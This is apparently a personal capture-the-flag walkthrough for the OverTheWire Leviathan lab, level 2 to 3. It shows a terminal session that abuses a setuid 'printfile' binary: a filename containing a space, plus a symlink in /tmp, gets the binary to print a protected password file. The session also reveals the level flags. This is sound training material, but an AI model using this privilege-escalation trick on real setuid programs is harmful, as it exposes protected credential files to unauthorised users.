# Leviathan Level 1 → Level 2 symLink and chmod 600 folder

## Previous Flag
<b>NsN1HwFoyN</b>

## Goal
Use previous password to log in SSH with user <b>leviathan2</b> and port <b>2223</b> accessed on leviathan.labs.overthewire.org
Du Hint: Use binary file to gain access to /etc/leviathan_pass/leviathan3 w/ setuid vulnerability

## What I learned
```
Link is a symbolic pointer to a file to allow access to the file from other folders (Windows shortcut)

Creating a symbolic link (symlink)
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/deletemelater/file ⌨️
                                points to                       name of shortcut
```

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker\overthewire> ssh leviathan2@leviathan.labs.overthewire.org -p 2223 ⌨️
leviathan2@leviathan:~$ ls -la ⌨️
total 36
drwxr-xr-x   2 root       root        4096 Jul 28 19:05 .
drwxr-xr-x 150 root       root        4096 Jul 28 19:06 ..
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Jul 28 18:47 .bashrc     
-r-sr-x---   1 leviathan3 leviathan2 15072 Jul 28 19:05 printfile   
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile    
leviathan2@leviathan:~$ file printfile ⌨️
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=79cfa8b87bb611f9cf6d6865010709e2ba5c8e3f, for GNU/Linux 3.2.0, not stripped
leviathan2@leviathan:~$ ./printfile ⌨️
*** File Printer ***       
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3 ⌨️
You cant have that file...
leviathan2@leviathan:~$ ./printfile .bash_logout ⌨️
# ~/.bash_logout: executed by bash(1) when login shell exits.  
# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q 
fi
leviathan2@leviathan:~$ ./printfile .bash_logout .profile
# ~/.bash_logout: executed by bash(1) when login shell exits.  

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q 
fi
leviathan2@leviathan:~$ mkdir /tmp/deletemelater ⌨️               # mktemp -d
leviathan2@leviathan:~$ touch /tmp/deletemelater/"file with space.txt" ⌨️
leviathan2@leviathan:~$ chmod +x /tmp/deletemelater/"file with space.txt" ⌨️
leviathan2@leviathan:~$ ls -la /tmp/deletemelater/ ⌨️
total 1360
drwxrwxr-x    2 leviathan2 leviathan2    4096 Aug  8 23:21 .
drwxrwx-wt 8751 root       root       1384448 Aug  8 23:22 ..
-rwxrwxr-x    1 leviathan2 leviathan2       0 Aug  8 23:21 file with space.txt
leviathan2@leviathan:~$ ./printfile /tmp/deletemelater/"file with space.txt" ⌨️
/bin/cat: /tmp/deletemelater/file: No such file or directory
/bin/cat: with: No such file or directory
/bin/cat: space.txt: No such file or directory

# Create file called ’file’ that links to password file and give ’leviathan3’ user permission to access the dir
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/deletemelater/file ⌨️
leviathan2@leviathan:~$ ls -la /tmp/deletemelater ⌨️
total 1360
drwxrwxr-x    2 leviathan2 leviathan2    4096 Aug  8 23:28 .
drwxrwx-wt 8752 root       root       1384448 Aug  8 23:28 ..
lrwxrwxrwx    1 leviathan2 leviathan2      30 Aug  8 23:28 file -> /etc/leviathan_pass/leviathan3 👀
-rwxrwxr-x    1 leviathan2 leviathan2       0 Aug  8 23:21 file with space.txt
leviathan2@leviathan:~$ chmod 777 /tmp/deletemelater ⌨️
leviathan2@leviathan:~$ ./printfile /tmp/deletemelater/"file with space.txt" ⌨️
f0n8h2iWLP 🔐
/bin/cat: with: No such file or directory
/bin/cat: space.txt: No such file or directory
```

## Flag
<b>f0n8h2iWLP</b>

## Continue
[Continue](./Leviathan0203.md)